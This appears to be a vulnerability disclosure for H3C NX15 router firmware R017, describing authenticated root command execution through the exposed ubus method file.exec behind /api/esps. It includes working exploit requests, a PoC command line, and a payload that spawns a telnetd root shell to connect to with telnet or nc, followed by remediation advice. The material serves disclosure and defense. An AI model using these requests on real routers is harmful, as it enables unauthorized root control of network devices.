# H3C NX15 R017 Exposed `file.exec` Authenticated Root Command Execution

## Summary

H3C NX15 Router firmware NX15V100R017 exposes the raw ubus object `file` through the authenticated `/api/esps` web API. The `file.exec` method is a native command-execution interface and runs with root privileges. An authenticated web administrator can invoke this method remotely and execute arbitrary commands as root.

## Vendor and Product

- Vendor: H3C
- Product: NX15 Router
- Affected firmware: NX15V100R017 / R017
- Component: `/api/esps` backend RPC
- Exposed object: `file`
- Exposed method: `exec`

## Vulnerability Type

- Improper exposure of dangerous system function
- Command execution by design exposed across an unsafe trust boundary
- Suggested CWE: CWE-749 Exposed Dangerous Method or Function
- Attack vector: Remote
- Authentication required: Yes
- Privileges required: Administrator web session
- User interaction required: No

## Impact

An authenticated attacker can execute arbitrary commands as root. Confirmed impact includes:

- Running basic commands through `file.exec`.
- Starting a temporary shell service.
- Connecting to the service and executing commands with UID 0.

## Technical Details

The web backend `/api/esps` contains generic ubus forwarding logic. Runtime testing confirmed that requests are not limited to `esps.*` objects and can reach the raw ubus object:

```text
file
```

The object exposes the method:

```text
file.exec {"command":"String","params":"Array","env":"Table"}
```

This method is intended for local system use and executes the supplied command as the privileged backend process. When exposed through `/api/esps`, it becomes a remote authenticated root command-execution primitive.

The critical point is that this is not a shell-metacharacter parsing bug in a product-specific script. The request flow is:

```text
POST /api/esps
  -> authenticated /www/api /esps handler
  -> lua /usr/lib/lua/protol_cvt.lua magic_link '<request-body>'
  -> /usr/lib/lua/magic_link/magic_link.lua maps object="file", method="exec"
  -> raw ubus method file.exec
```

In `magic_link.lua`, the external JSON fields are translated directly into ubus `path`, `func`, and `args`, so there is no application-level allowlist restricting callers to `esps.*` objects. As a result, any authenticated web administrator can invoke the native execution primitive itself.

## Firmware Paths for Audit

The following paths are firmware-internal paths relative to the extracted firmware root filesystem:

- `/www/api`: web API binary that accepts authenticated `/api/esps` requests and forwards them to ubus objects.
- `/usr/lib/lua/protol_cvt.lua`: Lua protocol bridge that decodes the JSON request and issues the ubus call.
- `/usr/lib/lua/magic_link/magic_link.lua`: direct `object/method/param` to `path/func/args` mapping for `/api/esps`.
- `file` ubus object provider: runtime ubus provider exposing `file.exec`; locate it in the extracted firmware by searching for the object name `file` and method name `exec`.
- `/sbin/rpcd`: system RPC daemon whose strings and runtime behavior confirm that native execution-oriented ubus functionality exists outside the product-specific `esps.*` scripts.
- `/bin/sh`: command interpreter used by the PoC when invoking `file.exec`.

Example RPC shape:

```json
[
  {
    "id": 1,
    "object": "file",
    "method": "exec",
    "param": {
      "command": "/bin/sh",
      "params": ["-c", "id >/tmp/file_exec_marker"],
      "env": {}
    }
  }
]
```

## Reproduction

Run the included PoC with valid administrator credentials:

```bash
python3 poc/postauth_file_exec_rce.py \
  --base http://192.168.8.1 \
  --username admin \
  --password '<admin-password>' \
  --spawn-shell \
  --port 2350 \
  --cleanup
```

The PoC:

1. Authenticates to the web interface.
2. Calls `/api/esps` with object `file` and method `exec`.
3. Executes a command that either returns root output directly in `stdout` or starts a temporary shell service.
4. Optionally connects to the shell and verifies root execution.

Expected result:

```text
uid=0(root)
```

Manual request sequence:

1. Authenticate through `POST /api/login/auth` and capture the `session`.
2. Send:

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json
AUTHENTICATION: <session>

[{"id":1,"object":"file","method":"exec","param":{"command":"/bin/sh","params":["-c","id; uname -a; echo FILE_EXEC_OK >/tmp/file_exec_marker"],"env":{}}}]
```

3. Inspect the JSON response. A successful result commonly includes `uid=0(root)` in `stdout`.

If an interactive proof is preferred, the PoC can additionally spawn a temporary `telnetd` listener with `--spawn-shell`.

BurpSuite step-by-step reproduction:

1. Authenticate in Burp Repeater:

```http
POST /api/login/auth HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Connection: close

{"username":"admin","password":"admin123"}
```

2. Extract `data.session` and send a direct proof request:

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"file","method":"exec","param":{"command":"/bin/sh","params":["-c","id; uname -a; echo FILE_EXEC_OK >/tmp/file_exec_marker"],"env":{}}}]
```

3. Confirm that the JSON response contains:

- `code = 0`
- `stdout` including `uid=0(root)`

4. Optional interactive-shell request:

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"file","method":"exec","param":{"command":"/bin/sh","params":["-c","echo FILE_EXEC_OK >/tmp/file_exec_marker; telnetd -p2350 -l /bin/sh"],"env":{}}}]
```

5. Connect:

```bash
telnet 192.168.8.1 2350
```

or:

```bash
nc 192.168.8.1 2350
```

and run:

```sh
id
uname -a
cat /tmp/file_exec_marker
```

6. Optional cleanup request:

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"file","method":"exec","param":{"command":"/bin/sh","params":["-c","pid=$(ps w | awk '/telnetd -p2350/ && !/awk/ {print $1}'); [ -n \"$pid\" ] && kill \"$pid\"; echo cleaned"],"env":{}}}]
```

## Evidence

- The Lua `magic_link` layer allows authenticated `/api/esps` callers to target raw ubus object `file` directly.
- Runtime object enumeration confirmed that `file.exec` exists and accepts `command`, `params`, and `env`.
- Runtime testing confirmed that `/api/esps` can invoke `file.exec` using an authenticated web session.
- Commands executed through this method run as root without requiring any shell metacharacter injection trick.

## Attachments

- Report: `report/postauth_file_exec_rce_report.md`
- PoC: `poc/postauth_file_exec_rce.py`

## Remediation

- Prevent `/api/esps` from forwarding requests to raw ubus objects such as `file`.
- Add a strict object and method allowlist for web-exposed RPC.
- Deny access to command-execution primitives from the web management interface.
- If command execution is required internally, bind it to local-only callers and enforce caller identity checks.
